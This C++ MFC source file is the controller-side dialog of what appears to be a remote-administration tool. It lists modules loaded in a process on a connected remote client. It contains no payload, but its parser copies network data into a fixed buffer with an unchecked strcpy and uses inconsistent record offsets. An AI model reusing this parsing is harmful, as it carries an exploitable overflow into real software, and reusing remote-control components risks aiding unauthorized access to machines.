// CDlgModuleManager ��Ϣ�������
// DlgModuleManager.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Server.h"
#include "DlgModuleManager.h"
#include "afxdialogex.h"


// CDlgModuleManager �Ի���

IMPLEMENT_DYNAMIC(CDlgModuleManager, CDialog)

CDlgModuleManager::CDlgModuleManager(CWnd * pParent, _CIOCPServer * IOCPServer, CONTEXT_OBJECT * ContextObject)
	: CDialog(IDD_DIALOG_MODULE_PROCESS_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));

	m_BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0));
}

CDlgModuleManager::~CDlgModuleManager()
{
}

void CDlgModuleManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_MODULE_MANAGER_SHOW, m_CListCtrl_Dialog_Module_Manager_Show);
}


BEGIN_MESSAGE_MAP(CDlgModuleManager, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CDlgModuleManager ��Ϣ�������


BOOL CDlgModuleManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ��ÿͻ���IP SetWindowText

	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //�õ����ӵ�ip 
	v1.Format("\\\\%s - Զ�̽��̹���", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//���öԻ������
	SetWindowText(v1);
	//���öԻ����ϵ�����
	/*LOGFONT Logfont;
	CFont* v2 = m_CListCtrl_Dialog_Module_Manager_Show.GetFont();
	v2->GetLogFont(&Logfont);
	//��������
	Logfont.lfHeight = Logfont.lfHeight*1.3;
	Logfont.lfWeight = Logfont.lfWeight*1.3;
	CFont v3;
	v3.CreateFontIndirect(&Logfont);
	m_CListCtrl_Dialog_Module_Manager_Show.SetFont(&v3);
	v3.Detach();*/

	m_CListCtrl_Dialog_Module_Manager_Show.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);

	switch (m_BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_ENUM_MODULE_REPLY:
	{
		m_CListCtrl_Dialog_Module_Manager_Show.InsertColumn(0, "ModuleName", LVCFMT_LEFT, 110);
		m_CListCtrl_Dialog_Module_Manager_Show.InsertColumn(1, "lpBaseOfDll", LVCFMT_LEFT, 150);
		m_CListCtrl_Dialog_Module_Manager_Show.InsertColumn(2, "SizeOfImage", LVCFMT_LEFT, 90);
		m_CListCtrl_Dialog_Module_Manager_Show.InsertColumn(3, "EntryPoint", LVCFMT_LEFT, 120);
		ShowModuleList();   //���ڵ�һ������������Ϣ��������Ž��̵��������԰�������ʾ���б���\0\0

		break;
	}
	default:
		break;
	}

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
	
}

void CDlgModuleManager::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_ContextObject->DialogID = 0;
	m_ContextObject->DialogHandle = NULL;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}


void CDlgModuleManager::ShowModuleList()
{

	char *BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1));

	LPVOID * lpBaseOfDll = NULL;
	DWORD* SizeOfImage = NULL;
	LPVOID* EntryPoint = NULL;
	char ModuleName[MAX_PATH];


	DWORD	Offset = 0;

	m_CListCtrl_Dialog_Module_Manager_Show.DeleteAllItems();
	CString v1;
	int i;
	for (i = 0; Offset <m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1; i++)
	{
		strcpy(ModuleName, (char*)(BufferData + Offset + sizeof(ULONG_PTR) + sizeof(PVOID) * 2));
		LPVOID* lpBaseOfDll = (LPVOID*)(BufferData + Offset);
		SizeOfImage = (DWORD*)(BufferData + Offset + sizeof(LPVOID));
		EntryPoint = (LPVOID*)(BufferData + Offset + sizeof(LPVOID)+sizeof(DWORD));

		
		v1.Format("%s", ModuleName);
		m_CListCtrl_Dialog_Module_Manager_Show.InsertItem(i, v1);
		v1.Format("0x%08X", *lpBaseOfDll);
		m_CListCtrl_Dialog_Module_Manager_Show.SetItemText(i, 1, v1);
		v1.Format("%d", *SizeOfImage);
		m_CListCtrl_Dialog_Module_Manager_Show.SetItemText(i, 2, v1);
		v1.Format("0x%08X", *EntryPoint);
		m_CListCtrl_Dialog_Module_Manager_Show.SetItemText(i, 3, v1);

		//��������ṹ������һ��ѭ��
		Offset += sizeof(LPVOID) * 2 + sizeof(DWORD) + strlen(ModuleName) + 1;
	}
}
